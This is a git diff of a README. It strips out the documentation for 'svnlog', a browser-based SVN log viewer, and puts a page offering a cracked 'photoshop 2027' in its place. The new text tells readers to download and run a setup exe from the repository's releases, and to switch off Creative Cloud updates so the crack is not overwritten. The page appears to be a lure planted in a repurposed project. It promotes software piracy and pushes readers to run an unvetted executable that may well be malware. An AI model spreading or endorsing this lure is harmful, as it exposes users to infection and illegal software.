@@ -1,26 +1,11 @@
-# svnlog
+# photoshop 2027
 
+full photoshop, no creative cloud login or anything. camera raw works too.
 
-## A more readable SVN log for the browser
+## usage
 
-`svnlog` is an alternative to the regular `svn log` command to deliver more readable results in the browser, while accepting all its parameters.
+1. download exe from releases
+2. run the setup and wait
+3. open photoshop, everything is unlocked
 
-![default output](screenshots/default-output.png)
-
-By default, svnlog limits the output to the last 20 commits. You can change this using the `--limit` parameter:
-
-    svnlog --limit 10
-
-This will output the last 10 commits instead.
-
-To show all files affected by the commit, use the `--verbose` switch:
-
-    svnlog --verbose
-
-![verbose output](screenshots/verbose-output.png)
-
-
-## License
-Copyright (c) 2013 Frederic Hemberger.  
-Copyright (c) 2024 jskyzero.  
-Licensed under the [MIT license](LICENSE-MIT).
+disable auto updates in creative cloud if you still have it installed, otherwise it might overwrite
